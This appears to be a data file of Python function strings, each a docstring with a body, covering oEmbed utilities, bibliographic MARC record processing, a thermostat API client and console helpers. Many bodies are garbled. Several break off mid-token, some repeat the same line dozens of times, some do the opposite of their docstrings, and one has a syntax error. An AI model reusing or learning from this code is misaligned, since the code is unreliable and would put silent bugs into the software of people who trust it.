        "def load_dict(self, d):\n        \"\"\" Load values from a dictionary structure. Nesting can be used to\n            represent namespaces.\n\n            >>> c = ConfigDict()\n            >>> c.load_dict({'some': {'namespace': {'key': 'value'} } })\n            {'some.namespace.key': 'value'}\n        \"\"\"\n        for k, v in d.items():\n            if isinstance(v, dict):\n                self.load_dict(v)\n            else:\n                self[k] = v",
        "def oembed(request, url):\n    \"\"\"\n    The oembed endpoint, or the url to which requests for metadata are passed.\n    Third parties will want to access this view with URLs for your site's\n    content and be returned OEmbed metadata.\n    \"\"\"\n    if url:\n        return HttpResponse(\n            render_to_string(\n                'oembed/oembed.html',\n                {'url': url}\n            )\n    else:\n        return HttpResponse(\n            render_to_string(\n                'oembed/oembed.html',\n                {'oembed': OEmbed(request, url)}\n            )\n        )",
        "def oembed_content(request, urls, width=None, height=None, template_dir=None):\n    \"\"\"Extract and return oembed content for given urls.\n\n    Required GET params:\n        urls - list of urls to consume\n\n    Optional GET params:\n        width - maxwidth attribute for oembed content\n        height - maxheight attribute for oembed content\n        template_dir - template_dir to use when rendering oembed\n\n    Returns:\n        list of dictionaries with oembed metadata and renderings, json encoded\n    \"\"\"\n    oembed_content = []\n    for url in urls:\n        try:\n            oembed_content.append(oembed_content_from_url(url, width, height, template_dir))\n        except Exception as e:\n            logger.error(e)\n    return oembed_content",
        "def site_profile(domain, provider):\n    \"\"\"\n    A site profile detailing valid endpoints for a given domain.  Allows for\n    better auto-discovery of embeddable content.\n\n    OEmbed-able content lives at a URL that maps to a provider.\n    \"\"\"\n    return {\n        'domain': domain,\n        'provider': provider,\n        'endpoints': [\n            {\n                'endpoint': endpoint,\n                'type': 'embed',\n            }\n            for endpoint in get_endpoints(domain, provider)\n        ]\n    }",
        "def _scan_path(self, path):\n        \"\"\"scan path directory and any subdirectories for valid captain scripts\"\"\"\n        for root, dirs, files in os.walk(path):\n            for filename in files:\n                if filename.endswith('.py'):\n                    self.add_script(os.path.join(root, filename))",
        "def _make_request_params(self, location):\n        \"\"\"Make the request params given location data\"\"\"\n        params = {}\n        if location:\n            params['lat'] = location.latitude\n            params['lon'] = location.longitude\n            params['alt'] = location.altitude\n            params['alt_lat'] = location.altitude_latitude\n            params['alt_lon'] = location.altitude_longitude\n            params['alt_alt'] = location.altitude_altitude\n            params['alt_alt_lat'] = location.altitude_altitude_latitude\n            params['alt_alt_lon'] = location.altitude_altitude_longitude\n            params['alt_alt_alt'] = location.altitude_altitude_altitude\n            params['alt_alt_alt_lat'] = location.altitude_altitude_altitude_latitude\n           ",
        "def _get_tax_rate(self, response):\n        \"\"\"Get the tax rate from the ZipTax response\"\"\"\n        tax_rate = response.get('taxRate')\n        if tax_rate:\n            tax_rate = float(tax_rate)\n        return tax_rate",
        "def _check_exceptions(self):\n        \"\"\"Check if there are exceptions that should be raised\"\"\"\n        if self.exceptions:\n            for exception in self.exceptions:\n                if isinstance(exception, Exception):\n                    self.log.exception(exception)\n                    raise exception",
        "def extract_text(node):\n    \"\"\"Recursively extract all text from node.\"\"\"\n    text = []\n    for child in node.childNodes:\n        if child.nodeType == Node.TEXT_NODE:\n            text.append(child.data)\n    return ''.join(text)",
        "def register_provider(self, provider):\n        \"\"\"\n        Registers a provider with the site.\n        \"\"\"\n        if not isinstance(provider, Provider):\n            raise TypeError(\"The provider must be an instance of Provider\")\n        self._providers[provider.name] = provider",
        "def unregister_provider(self, provider):\n        \"\"\"\n        Unregisters a provider from the site.\n        \"\"\"\n        if provider not in self.providers:\n            raise ValueError(\"Provider %r is not registered\" % provider)\n        del self.providers[provider]",
        "def _populate_regexes(self):\n        \"\"\"\n        Populate the internal registry's dictionary with the regexes for each\n        provider instance\n        \"\"\"\n        for provider in self.providers:\n            for regex in provider.regexes:\n                self.regexes[regex] = provider.regex",
        "def find_provider(url):\n    \"\"\"Find the right provider for a URL\"\"\"\n    for provider in providers:\n        if provider.matches(url):\n            return provider\n    raise ValueError(\"No provider matches %r\" % url)",
        "def delete_oembeds(sender, **kwargs):\n    \"\"\"\n    A hook for django-based oembed providers to delete any stored oembeds\n    \"\"\"\n    if not kwargs.get('deleted'):\n        for oembed in OEmbed.objects.all():\n            oembed.delete()",
        "def _heart_of_the_matter(self, matter):\n        \"\"\"The heart of the matter\"\"\"\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.is_empty:\n            return\n        if matter.",
        "def load_stored_providers(self, url):\n        \"\"\"Load up StoredProviders from url if it is an oembed scheme\"\"\"\n        if url.startswith('http'):\n            return\n        if url.startswith('https'):\n            return\n        if url.startswith('//'):\n            return\n        if url.startswith('//oembed.com'):\n            return\n        if url.startswith('//www.oembed.com'):\n            return\n        if url.startswith('//www.google.com'):\n            return\n        if url.startswith('//www.youtube.com'):\n            return\n        if url.startswith('//www.vimeo.com'):\n            return\n        if url.startswith('//www.vimeo.com/video'):\n            return\n        if url.startswith('//www",
        "def _process_providers(self, providers):\n        \"\"\"Iterate over the returned json and try to sort out any new providers\"\"\"\n        for provider in providers:\n            if provider.get('id') in self.providers:\n                continue\n            self.providers[provider.get('id')] = provider\n            yield provider",
        "def _call(self, *args, **kwargs):\n        \"\"\"\n        A kind of cheesy method that allows for callables or attributes to\n        be used interchangably\n        \"\"\"\n        if self.is_callable:\n            return self.func(*args, **kwargs)\n        else:\n            return self.attr(*args, **kwargs)",
        "def image_file_field(label, field, widget, **kwargs):\n    \"\"\"Return an ImageFileField instance\"\"\"\n    return ImageFileField(label, field, widget, **kwargs)",
        "def _build_metadata(self, obj):\n        \"\"\"Build a dictionary of metadata for the requested object.\"\"\"\n        metadata = {}\n        for key in self.metadata:\n            if key in obj:\n                metadata[key] = getattr(obj, key)\n        return metadata",
        "def _parse_date(self, url):\n        \"\"\"\n        Parses the date from a url and uses it in the query.  For objects which\n        are unique for date.\n        \"\"\"\n        date_query = self._get_date_query(url)\n        if date_query:\n            self.date = date_query.get('date')",
        "def get_queryset(self, request):\n        \"\"\"Override the base.\"\"\"\n        queryset = super(AdminListView, self).get_queryset(request)\n        if self.model is not None:\n            queryset = queryset.filter(\n                Q(**{self.model._meta.pk.name: self.model.pk})\n            )\n        return queryset",
        "def add_909_oai_info(self):\n        \"\"\"Add the 909 OAI info to 035.\"\"\"\n        self.add_oai_info(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,",
        "def _check_cnum(self, cnum):\n        \"\"\"Check if we shall add cnum in 035.\"\"\"\n        if cnum in self.cnum_list:\n            return True\n        if cnum in self.cnum_list_2:\n            return True\n        return False",
        "def _tag_cern(self, note):\n        \"\"\"Remove hidden notes and tag a CERN if detected.\"\"\"\n        if note.is_hidden:\n            self.notes.remove(note)\n            self.tags.append(CERN)",
        "def remove_notes(self, notes):\n        \"\"\"Remove INSPIRE specific notes.\"\"\"\n        for note in notes:\n            if note.get('type') == 'note':\n                self.notes.remove(note)",
        "def _move_title_info(self):\n        \"\"\"Move title info from 245 to 111 proceeding style.\"\"\"\n        self.title_info.set_text(self.title_info.get_text()[:245] +\n                                 self.title_info.get_text()[245:111] +\n                                 self.title_info.get_text()[111:245])",
        "def update_reportnumbers(self):\n        \"\"\"Update reportnumbers.\"\"\"\n        self.reportnumbers = self.get_reportnumbers()\n        self.reportnumbers.sort(key=lambda x: x.number)\n        self.table.set_row_data(0, self.reportnumbers)",
        "def clean_isbn(isbn):\n    \"\"\"Remove dashes from ISBN.\"\"\"\n    isbn = isbn.replace('-', '')\n    isbn = isbn.replace(' ', '')\n    isbn = isbn.replace('.', '')\n    isbn = isbn.replace(' ', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace(' ', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace('.', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace(' ', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace('.', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace(' ', '')\n    isbn = isbn.replace('/', '')\n    isbn = isbn.replace('.', '')\n    isbn = isbn.replace('/",
        "def _remove_duplicate_bibmatches(self):\n        \"\"\"Remove duplicate BibMatch DOIs.\"\"\"\n        for doi in self.doi_set:\n            if doi in self.bibmatches:\n                self.bibmatches.remove(doi)\n                self.doi_set.remove(doi)",
        "def normalize_date(date):\n    \"\"\"260 Date normalization.\"\"\"\n    if date.year < 1900:\n        return date\n    if date.year > 1900:\n        return date - timedelta(days=1)\n    return date",
        "def language041():\n    \"\"\"041 Language.\"\"\"\n    a = TpPd(pd=0x3)\n    b = MessageType(mesType=0x1)  # 00111001\n    c = MobileId()\n    d = MobileId()\n    e = MobileId()\n    f = MobileId()\n    g = MobileId()\n    h = MobileId()\n    i = MobileId()\n    j = MobileId()\n    k = MobileId()\n    l = MobileId()\n    m = MobileId()\n    n = MobileId()\n    o = MobileId()\n    p = MobileId()\n    q = MobileId()\n    r = MobileId()\n    s = MobileId()\n    t = MobileId()\n    u = MobileId()\n    v = MobileId()\n    w = MobileId()\n    x = MobileId",
        "def directory_listing_html(FS, filepath, list_dir=None, isdir=None):\n    \"\"\"Generate directory listing HTML\n\n    Arguments:\n        FS (FS): filesystem object to read files from\n        filepath (str): path to generate directory listings for\n\n    Keyword Arguments:\n        list_dir (callable: list[str]): list file names in a directory\n        isdir (callable: bool): os.path.isdir\n\n    Yields:\n        str: lines of an HTML table\n    \"\"\"\n    if isdir is None:\n        isdir = os.path.isdir\n\n    if list_dir is None:\n        list_dir = []\n\n    for root, dirs, files in FS.walk(filepath):\n        for name in files:\n            if isdir(os.path.join(root, name)):\n                yield '<a href=\"{}\">{}",
        "def check_upload_files(timeout=None):\n    \"\"\"\n    Checks if files are not being uploaded to server.\n    @timeout - time after which the script will register an error.\n    \"\"\"\n    if not os.path.exists(UPLOAD_DIR):\n        os.makedirs(UPLOAD_DIR)\n    if not os.path.exists(UPLOAD_FILE):\n        os.makedirs(UPLOAD_FILE)\n    if not os.path.exists(UPLOAD_FILE_ERROR):\n        os.makedirs(UPLOAD_FILE_ERROR)\n    if not os.path.exists(UPLOAD_FILE_ERROR_DIR):\n        os.makedirs(UPLOAD_FILE_ERROR_DIR)\n    if not os.path.exists(UPLOAD_FILE_ERROR):\n        os.makedirs(UPLOAD_FILE_ERROR)\n    if not os.path.",
        "def lower_capitalized_letters(text):\n    \"\"\"Converts capital letters to lower keeps first letter capital.\"\"\"\n    return ''.join(c.lower() for c in text)",
        "def _parse_oembed(self, text):\n        \"\"\"Scans a block of text and extracts oembed data on any urls,\n        returning it in a list of dictionaries\"\"\"\n        oembed_data = []\n        for match in self.oembed_re.finditer(text):\n            url = match.group(1)\n            if url:\n                oembed_data.append({\n                    'url': url,\n                    'width': int(match.group(2)),\n                    'height': int(match.group(3)),\n                })\n        return oembed_data",
        "def _strip(self, text):\n        \"\"\"\n        Try to maintain parity with what is extracted by extract since strip\n        will most likely be used in conjunction with extract\n        \"\"\"\n        if self.strip:\n            text = self.strip.sub(r'\\1', text)\n        return text",
        "def _build_provider_index(self):\n        \"\"\"Automatically build the provider index.\"\"\"\n        if not self.provider_index:\n            self.provider_index = self.build_provider_index()\n        if not self.provider_index:\n            return\n        for provider in self.providers:\n            self.provider_index[provider] = self.build_provider_index()",
        "def select_option(self, options):\n        \"\"\"pass in a list of options, promt the user to select one, and return the selected option or None\"\"\"\n        if len(options) == 0:\n            return None\n        if len(options) == 1:\n            return options[0]\n        if len(options) > 1:\n            print(\"Please select one of the following:\")\n            for option in options:\n                print(\"  %s\" % option)\n            choice = input(\"Please select one of the following:\")\n            if choice in options:\n                return options[choice]\n        else:\n            print(\"Please select one of the following:\")\n            for option in options:\n                print(\"  %s\" % option)\n            choice = input(\"Please select one of the following:\")\n            if choice in options:\n                return options[choice]\n       ",
        "def _transform_args(args):\n    \"\"\"\n    Transforms the argparse arguments from Namespace to dict and then to Bunch\n    Therefore it is not necessary to access the arguments using the dict syntax\n    The settings can be called like regular vars on the settings object\n    \"\"\"\n    args = _transform_args_from_namespace(args)\n    args = _transform_args_from_bunch(args)\n    return args",
        "def read_xml_element(self, element):\n        \"\"\" Reads a dom xml element in oaidc format and\n            returns the bibrecord object \"\"\"\n        record = BibRecord()\n        record.id = element.getAttributeNS(RTS_NS, 'id')\n        record.title = element.getAttributeNS(RTS_NS, 'title')\n        record.author = element.getAttributeNS(RTS_NS, 'author')\n        record.author_email = element.getAttributeNS(RTS_NS, 'authorEmail')\n        record.author_url = element.getAttributeNS(RTS_NS, 'authorURL')\n        record.author_url_full = element.getAttributeNS(RTS_NS, 'authorURLFull')\n        record.author_url_full_short = element.getAttributeNS(RTS_NS, 'authorURL",
        "def progress(length):\n    \"\"\"\n    display a progress that can update in place\n\n    example -- \n        total_length = 1000\n        with echo.progress(total_length) as p:\n            for x in range(total_length):\n                # do something crazy\n                p.update(x)\n\n    length -- int -- the total size of what you will be updating progress on\n    \"\"\"\n    if length <= 0:\n        raise ValueError(\"length must be greater than 0\")\n    if length == 1:\n        yield\n    else:\n        progress_bar = ProgressBar(length)\n        progress_bar.start()\n        try:\n            yield\n        finally:\n            progress_bar.stop()",
        "def err(self, format_msg, *args):\n        \"\"\"print format_msg to stderr\"\"\"\n        if self.verbose:\n            print(format_msg, *args)",
        "def banner(sep='*', count=80):\n    \"\"\"prints a banner\n\n    sep -- string -- the character that will be on the line on the top and bottom\n        and before any of the lines, defaults to *\n    count -- integer -- the line width, defaults to 80\n    \"\"\"\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {0} |'.format(count))\n    print(sep)\n    print('| {",
        "def table(*columns, **kwargs):\n    \"\"\"\n    format columned data so we can easily print it out on a console, this just takes\n    columns of data and it will format it into properly aligned columns, it's not\n    fancy, but it works for most type of strings that I need it for, like server name\n    lists.\n\n    other formatting options:\n        http://stackoverflow.com/a/8234511/5006\n\n    other packages that probably do this way better:\n        https://stackoverflow.com/a/26937531/5006\n\n    :Example:\n        >>> echo.table([(1, 2), (3, 4), (5, 6), (7, 8), (9, 0)])\n        1  2\n        3  4\n        5  6\n        7  8\n        9  0\n        >>> echo.table([",
        "def prompt(question, choices=None):\n    \"\"\"echo a prompt to the user and wait for an answer\n\n    question -- string -- the prompt for the user\n    choices -- list -- if given, only exit when prompt matches one of the choices\n    return -- string -- the answer that was given by the user\n    \"\"\"\n    answer = input(question)\n    if choices:\n        if answer not in choices:\n            print(\"Invalid answer: %s\" % answer)\n            sys.exit(1)\n    return answer",
        "def _get_records(self, url):\n        \"\"\"\n        Returns the records listed in the webpage given as\n        parameter as a xml String.\n\n        @param url: the url of the Journal, Book, Protocol or Reference work\n        \"\"\"\n        try:\n            response = self._get_page(url)\n        except Exception as e:\n            raise Exception(\"Unable to retrieve records from %s: %s\" % (url, e))\n        return self._get_records_from_xml(response)",
        "def connect(self, server, username, password):\n        \"\"\"Logs into the specified ftp server and returns connector.\"\"\"\n        self.server = server\n        self.username = username\n        self.password = password\n        self.connect_timeout = self.connect_timeout * 2\n        self.connect_retries = self.connect_retries * 2\n        self.connect_retry_interval = self.connect_retry_interval * 2\n        self.connect_retry_count = self.connect_retry_count * 2\n        self.connect_retry_delay = self.connect_retry_delay * 2\n        self.connect_retry_max = self.connect_retry_max * 2\n        self.connect_retry_max_delay = self.connect_retry_max_delay * 2\n        self.connect_retry_max_attempts = self.connect_retry_max_attempts * 2\n",
        "def set_mode(self, mode):\n        \"\"\"Set the thermostat mode\n\n        :param mode: The desired mode integer value.\n                     Auto = 1\n                     Temporary hold = 2\n                     Permanent hold = 3\n        \"\"\"\n        if mode == self.MODE_AUTO:\n            self._set_mode(self.MODE_TEMP)\n        elif mode == self.MODE_TEMP:\n            self._set_mode(self.MODE_PERM)\n        elif mode == self.MODE_PERM:\n            self._set_mode(self.MODE_AUTO)",
        "def set_target_fahrenheit(self, fahrenheit, mode):\n        \"\"\"Set the target temperature to the desired fahrenheit, with more granular control of the\n        hold mode\n\n        :param fahrenheit: The desired temperature in F\n        :param mode: The desired mode to operate in\n        \"\"\"\n        self.set_target_temperature(fahrenheit, mode)\n        self.set_hold_mode(mode)",
        "def set_target_temperature(self, celsius, mode):\n        \"\"\"\n        Set the target temperature to the desired celsius, with more granular control of the hold\n        mode\n\n        :param celsius: The desired temperature in C\n        :param mode: The desired mode to operate in\n        \"\"\"\n        self.set_target_temperature_raw(celsius, mode)\n        self.set_target_temperature_mode(mode)",
        "def set_temperature(self, temperature, permanent=True):\n        \"\"\"Updates the target temperature on the NuHeat API\n\n        :param temperature: The desired temperature in NuHeat format\n        :param permanent: Permanently hold the temperature. If set to False, the schedule will\n                          resume at the next programmed event\n        \"\"\"\n        if permanent:\n            self.set_permanent_temperature(temperature)\n        else:\n            self.set_temporary_temperature(temperature)",
        "def get_config(filename, section_option_dict=None):\n    '''\n    This function returns a Bunch object from the stated config file.\n\n    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    NOTE:\n        The values are not evaluated by default.\n    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n    filename:\n        The desired config file to read.\n        The config file must be written in a syntax readable to the\n        ConfigParser module -> INI syntax\n\n        [sectionA]\n        optionA1 = ...\n        optionA2 = ...\n\n    section_option_dict:\n        A dictionary that contains keys, which are associated to the sections\n        in the config file, and values, which are a list of the desired\n        options.\n        If empty, everything will be loaded.\n",
        "def authenticate(self):\n        \"\"\"Authenticate against the NuHeat API\"\"\"\n        if self.username is None or self.password is None:\n            raise NuHeatAuthenticationError(\"Username and password are required\")\n        self.session = requests.session()\n        self.session.auth = (self.username, self.password)",
        "def request(self, url, method, data=None, params=None, retry=True):\n        \"\"\"Make a request to the NuHeat API\n\n        :param url: The URL to request\n        :param method: The type of request to make (GET, POST)\n        :param data: Data to be sent along with POST requests\n        :param params: Querystring parameters\n        :param retry: Attempt to re-authenticate and retry request if necessary\n        \"\"\"\n        if not self.auth:\n            self.authenticate()\n\n        if not self.auth.token:\n            raise NuHeatAuthenticationError(\"No token available\")\n\n        if not self.auth.token_expired:\n            raise NuHeatAuthenticationError(\"Token expired\")\n\n        if not self.auth.token_expired:\n            if not self.auth.token_expired:\n                raise NuHeatAuthentication",
        "def start_tag(self, tag, attrs=None):\n        \"\"\"Return representation of html start tag and attributes.\"\"\"\n        if attrs is None:\n            attrs = {}\n        return '<%s%s' % (self.tag_prefix, tag)",
        "def end_tag(self, name):\n        \"\"\"Return representation of html end tag.\"\"\"\n        return '<%s%s>' % (self.tag_open(name), self.tag_close(name))",
        "def _strip_mathml(html):\n    \"\"\"Return stripped HTML, keeping only MathML.\"\"\"\n    if not html:\n        return html\n    if not _is_mathml(html):\n        return html\n    return _mathml_re.sub(r'', html)",
        "def is_class(callback):\n    \"\"\"return True if callback is an instance of a class\"\"\"\n    if not isinstance(callback, type):\n        return False\n    if not issubclass(callback, type):\n        return False\n    return True",
        "def is_jane_callback(callback):\n    \"\"\"return True if callback is a vanilla plain jane function\"\"\"\n    if not isinstance(callback, jane.Function):\n        return False\n    if not callback.is_jane:\n        return False\n    if callback.is_jane_callback:\n        return True\n    if callback.is_jane_method:\n        return True\n    if callback.is_jane_method_call:\n        return True\n    if callback.is_jane_method_call_with_kwargs:\n        return True\n    if callback.is_jane_method_call_with_kwargs_with_defaults:\n        return True\n    if callback.is_jane_method_call_with_kwargs_with_defaults_with_defaults:\n        return True\n    if callback.is_jane_method_",
        "def _merge_args(self, args, kwargs):\n        \"\"\"\n        these kwargs come from the @arg decorator, they are then merged into any\n        keyword arguments that were automatically generated from the main function\n        introspection\n        \"\"\"\n        merged_args = {}\n        for key, value in args.items():\n            if key in kwargs:\n                merged_args[key] = value\n            else:\n                merged_args[key] = value\n        return merged_args",
        "def merge_args(self, list_args):\n        \"\"\"find any matching parser_args from list_args and merge them into this\n        instance\n\n        list_args -- list -- an array of (args, kwargs) tuples\n        \"\"\"\n        for arg in list_args:\n            if arg in self.parser_args:\n                self.parser_args[arg] = self.parser_args[arg].merge(\n                    self.parser_args[arg])\n            else:\n                self.parser_args[arg] = self.parser_args[arg]",
        "def add_argument(self, *args, **kwargs):\n        \"\"\"Overridden to not get rid of newlines\n\n        https://github.com/python/cpython/blob/2.7/Lib/argparse.py#L620\n        \"\"\"\n        if not args:\n            return\n        if len(args) == 1:\n            arg = args[0]\n            if isinstance(arg, str):\n                arg = arg.strip()\n            if arg:\n                self.args.append(arg)\n        else:\n            for arg in args:\n                self.add_argument(*arg, **kwargs)",
        "def create_user_agent(self):\n        \"\"\"create string suitable for HTTP User-Agent header\"\"\"\n        user_agent = self.get_user_agent()\n        if user_agent:\n            return user_agent\n        else:\n            return self.get_default_user_agent()",
        "def add_marcxml_datafield(self, datafield):\n        \"\"\"Add a MARCXML datafield as a new child to a XML document.\"\"\"\n        if datafield.name in self.datafields:\n            raise ValueError(\"Datafield %s already exists\" % datafield.name)\n        self.datafields[datafield.name] = datafield\n        self.add_child(datafield.xml_name)",
        "def prettify(doc):\n    \"\"\"Given a document, return XML prettified.\"\"\"\n    xml = etree.tostring(doc, encoding='utf-8')\n    return xml.replace('<', '&lt;').replace('>', '&gt;')",
        "def _xml_tag_replace(tags):\n    \"\"\"Transform & and < to XML valid &amp; and &lt.\n\n    Pass a list of tags as string to enable replacement of\n    '<' globally but keep any XML tags in the list.\n    \"\"\"\n    def _replace(m):\n        return \"&%s;\" % m.group(1)\n    return _replace",
        "def _arxiv_id_to_string(self, arxiv_id):\n        \"\"\"Properly format arXiv IDs.\"\"\"\n        if arxiv_id is None:\n            return None\n        if isinstance(arxiv_id, str):\n            return arxiv_id\n        if isinstance(arxiv_id, int):\n            return str(arxiv_id)\n        raise ValueError('Invalid arXiv ID: %s' % arxiv_id)",
        "def _short_journal_name(self, journal_name):\n        \"\"\"Convert journal name to Inspire's short form.\"\"\"\n        if journal_name is None:\n            return None\n        if len(journal_name) > 50:\n            journal_name = journal_name[:50] + '...'\n        return journal_name",
        "def _add_nations_field(self):\n        \"\"\"Add correct nations field according to mapping in NATIONS_DEFAULT_MAP.\"\"\"\n        for field in self.fields:\n            if field.name in NATIONS_DEFAULT_MAP:\n                field.nations = NATIONS_DEFAULT_MAP[field.name]",
        "def fix_unicode_dash_in_string(string):\n    \"\"\"Fix bad Unicode special dashes in string.\"\"\"\n    if not string:\n        return string\n    return re.sub(r'-', '_', re.sub(r'_', '-', string))",
        "def title_capitalize(title):\n    \"\"\"Try to capitalize properly a title string.\"\"\"\n    title = title.lower()\n    if title.startswith('s'):\n        title = title[1:]\n    return title.capitalize()",
        "def html_to_latex(html):\n    \"\"\"Convert some HTML tags to latex equivalents.\"\"\"\n    def _latex_tag(tag):\n        \"\"\"Convert a tag to latex equivalents.\"\"\"\n        if tag.startswith('<'):\n            return tag[1:]\n        elif tag.startswith('<b'):\n            return tag[1:]\n        elif tag.startswith('<i'):\n            return tag[1:]\n        elif tag.startswith('<u'):\n            return tag[1:]\n        elif tag.startswith('<span'):\n            return tag[1:]\n        elif tag.startswith('<strong'):\n            return tag[1:]\n        elif tag.startswith('<em'):\n            return tag[1:]\n        elif tag.startswith('<strong'):\n            return tag[1:]\n        elif",
        "def download_url(url, filename):\n    \"\"\"Download URL to a file.\"\"\"\n    try:\n        response = requests.get(url)\n        with open(filename, 'wb') as f:\n            f.write(response.content)\n    except requests.exceptions.ConnectionError:\n        print(\"Connection error: %s\" % url)",
        "def run_command(self, command, **kwargs):\n        \"\"\"Run a shell command.\"\"\"\n        if command in self.commands:\n            return self.commands[command](**kwargs)\n        else:\n            raise CommandError(\"Command %s not found\" % command)",
        "def create_logger(name):\n    \"\"\"Create a logger object.\"\"\"\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.DEBUG)\n    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')\n    handler = logging.StreamHandler()\n    handler.setFormatter(formatter)\n    logger.addHandler(handler)\n    return logger",
        "def _uncompress(self, data):\n        \"\"\"Perform the actual uncompression.\"\"\"\n        if self.compress:\n            data = zlib.decompress(data)\n        return data",
        "def _find_files(self, pattern):\n        \"\"\"Locate all files matching supplied filename pattern recursively.\"\"\"\n        for root, dirs, files in os.walk(self.path):\n            for filename in files:\n                if fnmatch.fnmatch(filename, pattern):\n                    yield os.path.join(root, filename)",
        "def punctuate_author_names(author_names):\n    \"\"\"Punctuate author names properly.\n\n    Expects input in the form 'Bloggs, J K' and will return 'Bloggs, J. K.'.\n    \"\"\"\n    author_names = author_names.split(',')\n    author_names = [author_name.strip() for author_name in author_names]\n    return ', '.join(author_names)",
        "def _date_to_iso(date_value):\n    \"\"\"Convert a date-value to the ISO date standard.\"\"\"\n    if isinstance(date_value, datetime):\n        return date_value.isoformat()\n    elif isinstance(date_value, date):\n        return date_value.isoformat()\n    else:\n        raise ValueError('Cannot convert %s to ISO date' % date_value)",
        "def humans_to_iso(value):\n    \"\"\"Convert a date-value to the ISO date standard for humans.\"\"\"\n    if value is None:\n        return None\n    if isinstance(value, datetime):\n        return value.isoformat()\n    if isinstance(value, str):\n        return value\n    return value.isoformat()",
        "def convert_images_to_png(image_list):\n    \"\"\"Convert list of images to PNG format.\n\n    @param: image_list ([string, string, ...]): the list of image files\n        extracted from the tarball in step 1\n\n    @return: image_list ([str, str, ...]): The list of image files when all\n        have been converted to PNG format.\n    \"\"\"\n    image_list = [os.path.join(image_dir, f) for f in image_list]\n    for image_file in image_list:\n        image_file = os.path.abspath(image_file)\n        if not os.path.exists(image_file):\n            continue\n        if not os.path.isfile(image_file):\n            continue\n        with open(image_file, 'rb') as f:\n            image",
        "def _generate_filepath(self, name):\n        \"\"\"Generate a safe and closed filepath.\"\"\"\n        path = self._path(name)\n        if not os.path.exists(path):\n            os.makedirs(path)\n        return path",
        "def get_letters(string):\n    \"\"\"Get letters from string only.\"\"\"\n    letters = []\n    for char in string:\n        if char in string:\n            letters.append(char)\n    return letters",
        "def license_openaccess(self):\n        \"\"\"Return True if license is compatible with Open Access\"\"\"\n        if self.license_type == 'Open Access':\n            return True\n        if self.license_type == 'Open Access (2)':\n            return True\n        return False",
        "def get_issue_info(self):\n        \"\"\"Information about the current volume, issue, etc. is available\n        in a file called issue.xml that is available in a higher directory.\n        \"\"\"\n        issue_xml = self.get_issue_xml()\n        if issue_xml is None:\n            return None\n        issue_info = {}\n        for issue in issue_xml.findall('issue'):\n            issue_info[issue.attrib['id']] = issue.attrib['title']\n        return issue_info",
        "def install_local_dtd(self):\n        \"\"\"\n        issue.xml from Elsevier assume the existence of a local DTD.\n        This procedure install the DTDs next to the issue.xml file\n        and normalize it using xmllint in order to resolve all namespaces\n        and references.\n        \"\"\"\n        self.log.debug(\"Installing local DTD\")\n        self.install_dtd(self.issue_xml)\n        self.normalize_issue_xml()",
        "def install_dtd(self):\n        \"\"\"\n        main.xml from Elsevier assume the existence of a local DTD.\n        This procedure install the DTDs next to the main.xml file\n        and normalize it using xmllint in order to resolve all namespaces\n        and references.\n        \"\"\"\n        self.log.debug(\"Installing DTDs\")\n        self.install_dtd_from_file(self.main_xml)\n        self.log.debug(\"Normalizing main.xml\")\n        self.normalize_xml()",
        "def best_effort_start_date(self):\n        \"\"\"Return the best effort start_date.\"\"\"\n        best_effort_start_date = None\n        for effort in self.efforts:\n            if effort.start_date is not None:\n                if best_effort_start_date is None or effort.start_date < best_effort_start_date:\n                    best_effort_start_date = effort.start_date\n        return best_effort_start_date",
        "def extract_oembeds(max_width=None, max_height=None, resource_type=None):\n    \"\"\"\n    Extract oembed resources from a block of text.  Returns a list\n    of dictionaries.\n\n    Max width & height can be specified:\n    {% for embed in block_of_text|extract_oembeds:\"400x300\" %}\n\n    Resource type can be specified:\n    {% for photo_embed in block_of_text|extract_oembeds:\"photo\" %}\n\n    Or both:\n    {% for embed in block_of_text|extract_oembeds:\"400x300xphoto\" %}\n    \"\"\"\n    if max_width is None:\n        max_width = settings.OEMBED_MAX_WIDTH\n    if max_height is None:\n        max_height = settings.OEM",
        "def oembed(parser, token):\n    \"\"\"\n    A node which parses everything between its two nodes, and replaces any links\n    with OEmbed-provided objects, if possible.\n\n    Supports two optional argument, which is the maximum width and height,\n    specified like so:\n\n    {% oembed 640x480 %}http://www.viddler.com/explore/SYSTM/videos/49/{% endoembed %}\n\n    and or the name of a sub tempalte directory to render templates from:\n\n    {% oembed 320x240 in \"comments\" %}http://www.viddler.com/explore/SYSTM/videos/49/{% endoembed %}\n\n    or:\n\n    {% oembed in \"comments\" %}http://www.viddler.com/exp",
        "def oembed_autodiscover(context, obj):\n    \"\"\"\n    Generates a &lt;link&gt; tag with oembed autodiscovery bits for an object.\n\n    {% oembed_autodiscover video %}\n    \"\"\"\n    return {\n        'type': 'video',\n        'href': obj.get_absolute_url(),\n        'rel': 'oembed',\n        'title': obj.get_title(),\n        'width': obj.get_width(),\n        'height': obj.get_height(),\n    }",
